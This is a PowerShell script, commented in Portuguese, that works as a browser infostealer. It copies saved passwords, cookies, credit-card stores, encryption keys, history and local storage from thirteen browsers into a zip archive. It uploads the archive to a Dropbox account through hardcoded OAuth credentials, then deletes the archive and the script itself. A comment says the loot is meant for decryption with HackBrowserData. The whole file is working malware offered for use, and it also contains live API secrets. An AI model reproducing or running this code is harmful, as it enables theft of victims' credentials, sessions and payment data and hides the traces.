<#

        .DESCRIPTION

        Os arquivos copiados devem ser utilizados
        no app HackBrowserData para realizar a descriptografia.

        https://github.com/moonD4rk/HackBrowserData
        
#>

$base_path = $env:USERPROFILE + "\AppData"

$edgeProfilePath        = $base_path + "\Local\Microsoft\Edge\User Data\Default\"
$chromeUserDataPath     = $base_path + "\Local\Google\Chrome\User Data\Default\"
$yandexProfilePath      = $base_path + "\Local\Yandex\YandexBrowser\User Data\Default\"
$firefoxProfilePath     = $base_path + "\Roaming\Mozilla\Firefox\Profiles\"
$chromeBetaUserDataPath = $base_path + "\Local\Google\Chrome Beta\User Data\Default\"
$chromiumUserDataPath   = $base_path + "\Local\Chromium\User Data\Default\"
$braveProfilePath       = $base_path + "\Local\BraveSoftware\Brave-Browser\User Data\Default\"
$speed360ProfilePath    = $base_path + "\Local\360chrome\Chrome\User Data\Default\"
$qqBrowserProfilePath   = $base_path + "\Local\Tencent\QQBrowser\User Data\Default\"
$operaProfilePath       = $base_path + "\Roaming\Opera Software\Opera Stable\"
$operaGXProfilePath     = $base_path + "\Roaming\Opera Software\Opera GX Stable\"
$vivaldiProfilePath     = $base_path + "\Local\Vivaldi\User Data\Default\"
$coccocProfilePath      = $base_path + "\Local\CocCoc\Browser\User Data\Default\"

if (Test-Path -Path "$($ENV:LOCALAPPDATA)\Dump") {
    Remove-Item "$($ENV:LOCALAPPDATA)\Dump" -Recurse 
}

if (Test-Path "$($ENV:LOCALAPPDATA)\Dump.zip") {
    Remove-Item "$($ENV:LOCALAPPDATA)\Dump.zip"
}

New-Item "$($ENV:LOCALAPPDATA)\Dump" -itemType Directory

Function DumpEdge{
    
    if (Test-Path -Path $edgeProfilePath) {
        $fileChromiumKey          = $edgeProfilePath + "Local State"
        $fileChromiumCredit       = $edgeProfilePath + "Web Data"
        $fileChromiumPassword     = $edgeProfilePath + "Login Data"
        $fileChromiumHistory      = $edgeProfilePath + "History"
        $fileChromiumDownload     = $edgeProfilePath + "History"
        $fileChromiumCookie       = $edgeProfilePath + "Cookies"
        $fileChromiumBookmark     = $edgeProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $edgeProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $edgeProfilePath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\Edge" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\Edge\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\Extensions"
    } else {
            
    }
}

Function DumpChrome{
    
    if (Test-Path -Path $chromeUserDataPath) {
        $fileChromiumKey          = $chromeUserDataPath + "Local State"
        $fileChromiumCredit       = $chromeUserDataPath + "Web Data"
        $fileChromiumPassword     = $chromeUserDataPath + "Login Data"
        $fileChromiumHistory      = $chromeUserDataPath + "History"
        $fileChromiumDownload     = $chromeUserDataPath + "History"
        $fileChromiumCookie       = $chromeUserDataPath + "Cookies"
        $fileChromiumBookmark     = $chromeUserDataPath + "Bookmarks"
        $fileChromiumLocalStorage = $chromeUserDataPath + "Local Storage/leveldb"
        $fileChromiumExtension    = $chromeUserDataPath + "Extensions"

        New-Item "$($ENV:LOCALAPPDATA)\Dump\Chrome" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\Chrome\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Extensions"
    } else {
                
    }
}

Function DumpYandex{

    if (Test-Path -Path $yandexProfilePath) {

        $fileYandexPassword = $yandexProfilePath + "Ya Passman Data"
        $fileYandexCredit   = $yandexProfilePath + "Ya Credit Cards"

        New-Item "$($ENV:LOCALAPPDATA)\Dump\Yandex" -itemType Directory

        Copy-Item -Path $fileYandexPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Yandex\Ya Passman Data"
        Copy-Item -Path $fileYandexCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Yandex\Ya Credit Cards"
    } else {
                 
    }
}

Function DumpFirefox{
    
    if (Test-Path -Path $firefoxProfilePath) {

        New-Item "$($ENV:LOCALAPPDATA)\Dump\Firefox" -itemType Directory

        Get-ChildItem -Path $firefoxProfilePath |
        Foreach-Object {
            $fileFirefoxKey4         = $firefoxProfilePath + $_.Name + "\key4.db"
            $fileFirefoxCookie       = $firefoxProfilePath + $_.Name + "\cookies.sqlite"
            $fileFirefoxPassword     = $firefoxProfilePath + $_.Name + "\logins.json"
            $fileFirefoxData         = $firefoxProfilePath + $_.Name + "\places.sqlite"
            $fileFirefoxLocalStorage = $firefoxProfilePath + $_.Name + "\webappsstore.sqlite"
            $fileFirefoxExtension    = $firefoxProfilePath + $_.Name + "\extensions.json"

            New-Item "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)" -itemType Directory

            Copy-Item -Path $fileFirefoxKey4 -Destination "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)\key4.db"
            Copy-Item -Path $fileFirefoxCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)\cookies.sqlite"
            Copy-Item -Path $fileFirefoxPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)\logins.json"
            Copy-Item -Path $fileFirefoxData -Destination "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)\places.sqlite"
            Copy-Item -Path $fileFirefoxLocalStorage -Destination "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)\webappsstore.sqlite"
            Copy-Item -Path $fileFirefoxExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)\extensions.json"
        }
    } else {
                        
    }

}

Function DumpChromeBeta{
    
    if (Test-Path -Path $chromeBetaUserDataPath) {
        $fileChromiumKey          = $chromeBetaUserDataPath + "Local State"
        $fileChromiumCredit       = $chromeBetaUserDataPath + "Web Data"
        $fileChromiumPassword     = $chromeBetaUserDataPath + "Login Data"
        $fileChromiumHistory      = $chromeBetaUserDataPath + "History"
        $fileChromiumDownload     = $chromeBetaUserDataPath + "History"
        $fileChromiumCookie       = $chromeBetaUserDataPath + "Cookies"
        $fileChromiumBookmark     = $chromeBetaUserDataPath + "Bookmarks"
        $fileChromiumLocalStorage = $chromeBetaUserDataPath + "Local Storage/leveldb"
        $fileChromiumExtension    = $chromeBetaUserDataPath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Extensions"
    } else {
                
    }
}

Function DumpChromium{
    
    if (Test-Path -Path $chromiumUserDataPath) {
        $fileChromiumKey          = $chromiumUserDataPath + "Local State"
        $fileChromiumCredit       = $chromiumUserDataPath + "Web Data"
        $fileChromiumPassword     = $chromiumUserDataPath + "Login Data"
        $fileChromiumHistory      = $chromiumUserDataPath + "History"
        $fileChromiumDownload     = $chromiumUserDataPath + "History"
        $fileChromiumCookie       = $chromiumUserDataPath + "Cookies"
        $fileChromiumBookmark     = $chromiumUserDataPath + "Bookmarks"
        $fileChromiumLocalStorage = $chromiumUserDataPath + "Local Storage/leveldb"
        $fileChromiumExtension    = $chromiumUserDataPath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\Chromium" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\Chromium\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Extensions"
    } else {
                
    }
}

Function DumpBrave{
    
    if (Test-Path -Path $braveProfilePath) {
        $fileChromiumKey          = $braveProfilePath + "Local State"
        $fileChromiumCredit       = $braveProfilePath + "Web Data"
        $fileChromiumPassword     = $braveProfilePath + "Login Data"
        $fileChromiumHistory      = $braveProfilePath + "History"
        $fileChromiumDownload     = $braveProfilePath + "History"
        $fileChromiumCookie       = $braveProfilePath + "Cookies"
        $fileChromiumBookmark     = $braveProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $braveProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $braveProfilePath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\Brave" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\Brave\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\Extensions"
    } else {
                
    }
}

Function DumpSpeed360{
    
    if (Test-Path -Path $speed360ProfilePath) {
        $fileChromiumKey          = $speed360ProfilePath + "Local State"
        $fileChromiumCredit       = $speed360ProfilePath + "Web Data"
        $fileChromiumPassword     = $speed360ProfilePath + "Login Data"
        $fileChromiumHistory      = $speed360ProfilePath + "History"
        $fileChromiumDownload     = $speed360ProfilePath + "History"
        $fileChromiumCookie       = $speed360ProfilePath + "Cookies"
        $fileChromiumBookmark     = $speed360ProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $speed360ProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $speed360ProfilePath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\Speed360" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\Speed360\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Extensions"
    } else {
                
    }
}

Function DumpQQBrowser{
    
    if (Test-Path -Path $qqBrowserProfilePath) {
        $fileChromiumKey          = $qqBrowserProfilePath + "Local State"
        $fileChromiumCredit       = $qqBrowserProfilePath + "Web Data"
        $fileChromiumPassword     = $qqBrowserProfilePath + "Login Data"
        $fileChromiumHistory      = $qqBrowserProfilePath + "History"
        $fileChromiumDownload     = $qqBrowserProfilePath + "History"
        $fileChromiumCookie       = $qqBrowserProfilePath + "Cookies"
        $fileChromiumBookmark     = $qqBrowserProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $qqBrowserProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $qqBrowserProfilePath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\QQBrowser" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Extensions"
    } else {
                
    }
}

Function DumpOpera{
    
    if (Test-Path -Path $operaProfilePath) {
        $fileChromiumKey          = $operaProfilePath + "Local State"
        $fileChromiumCredit       = $operaProfilePath + "Web Data"
        $fileChromiumPassword     = $operaProfilePath + "Login Data"
        $fileChromiumHistory      = $operaProfilePath + "History"
        $fileChromiumDownload     = $operaProfilePath + "History"
        $fileChromiumCookie       = $operaProfilePath + "Cookies"
        $fileChromiumBookmark     = $operaProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $operaProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $operaProfilePath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\Opera" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\Opera\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Extensions"
    } else {
                
    }
}

Function DumpOperaGX{
    
    if (Test-Path -Path $operaGXProfilePath) {
        $fileChromiumKey          = $operaGXProfilePath + "Local State"
        $fileChromiumCredit       = $operaGXProfilePath + "Web Data"
        $fileChromiumPassword     = $operaGXProfilePath + "Login Data"
        $fileChromiumHistory      = $operaGXProfilePath + "History"
        $fileChromiumDownload     = $operaGXProfilePath + "History"
        $fileChromiumCookie       = $operaGXProfilePath + "Cookies"
        $fileChromiumBookmark     = $operaGXProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $operaGXProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $operaGXProfilePath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\OperaGX" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Extensions"
    } else {
         
    }
}

Function DumpVivaldi{
    
    if (Test-Path -Path $vivaldiProfilePath) {
        $fileChromiumKey          = $vivaldiProfilePath + "Local State"
        $fileChromiumCredit       = $vivaldiProfilePath + "Web Data"
        $fileChromiumPassword     = $vivaldiProfilePath + "Login Data"
        $fileChromiumHistory      = $vivaldiProfilePath + "History"
        $fileChromiumDownload     = $vivaldiProfilePath + "History"
        $fileChromiumCookie       = $vivaldiProfilePath + "Cookies"
        $fileChromiumBookmark     = $vivaldiProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $vivaldiProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $vivaldiProfilePath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\Vivaldi" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Extensions"
    } else {
                
    }
}

Function DumpCoccoc{
    
    if (Test-Path -Path $coccocProfilePath) {
        $fileChromiumKey          = $coccocProfilePath + "Local State"
        $fileChromiumCredit       = $coccocProfilePath + "Web Data"
        $fileChromiumPassword     = $coccocProfilePath + "Login Data"
        $fileChromiumHistory      = $coccocProfilePath + "History"
        $fileChromiumDownload     = $coccocProfilePath + "History"
        $fileChromiumCookie       = $coccocProfilePath + "Cookies"
        $fileChromiumBookmark     = $coccocProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $coccocProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $coccocProfilePath + "Extensions"
        
        New-Item "$($ENV:LOCALAPPDATA)\Dump\Coccoc" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\History"
        Copy-Item -Path $fileChromiumDownload -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\History"
        Copy-Item -Path $fileChromiumCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Extensions"
    } else {
                
    }
}

DumpChrome
DumpChromeBeta
DumpEdge
DumpChromium
DumpBrave
DumpSpeed360
DumpQQBrowser
DumpOpera
DumpOperaGX
DumpVivaldi
DumpCoccoc
DumpYandex
DumpFirefox

Compress-Archive -Path "$($ENV:LOCALAPPDATA)\Dump" -DestinationPath "$($ENV:LOCALAPPDATA)\Dump.zip"
Remove-Item "$($ENV:LOCALAPPDATA)\Dump" -Recurse

<#

        .DESCRIPTION

        Enviar os arquivos copiados para algum local remoto, como por
        exemplo: Email, FTP... No código atual os arquivos são enviados para o DropBox.

#>

Function UploadFile{
    param(
        [String] $access_token
    )

    $dumpfile = "$($ENV:LOCALAPPDATA)\Dump.zip"
    $DropboxTargetPath = "/dump_$($env:UserName).zip"
    $endpoint = "https://content.dropboxapi.com/2/files/upload"

    $arg = '{ "path": "' + ${DropboxTargetPath} + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $access_token

    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", ${authorization})
    $headers.Add("Dropbox-API-Arg", ${arg})
    $headers.Add("Content-Type", 'application/octet-stream')

    $response = Invoke-RestMethod -Uri $endpoint -Method Post -InFile $dumpfile -Headers ${headers}

    return $response
}

Function GetAccessToken{
    $endpoint       = "https://api.dropbox.com/oauth2/token"
    $refresh_token  = "2yx805pK7QoAAAAAAAAAAaflTn352DcJ_1PSw9tf4MuLQIVcMj7h99zC4IUdtg_9"
    $grant_type     = "refresh_token"
    $client_id      = "5z2a5szvdv1h55b"
    $client_secret  = "1vl618rswp106g1"

    $boundary = [System.Guid]::NewGuid().ToString(); 
    $LF = "`r`n";
    
    $bodyLines = ( 
        "--$boundary",
        "Content-Disposition: form-data; name=`"refresh_token`"$LF",
        $refresh_token,
        "--$boundary",
        "Content-Disposition: form-data; name=`"grant_type`"$LF",
        $grant_type,
        "--$boundary",
        "Content-Disposition: form-data; name=`"client_id`"$LF",
        $client_id,
        "--$boundary",
        "Content-Disposition: form-data; name=`"client_secret`"$LF",
        $client_secret,
        "--$boundary--$LF" 
    ) -join $LF
    
    $response = Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines

    return $response.access_token
}

$access_token = GetAccessToken
UploadFile $access_token


Remove-Item "$($ENV:LOCALAPPDATA)\Dump.zip"
Remove-Item $PSCommandPath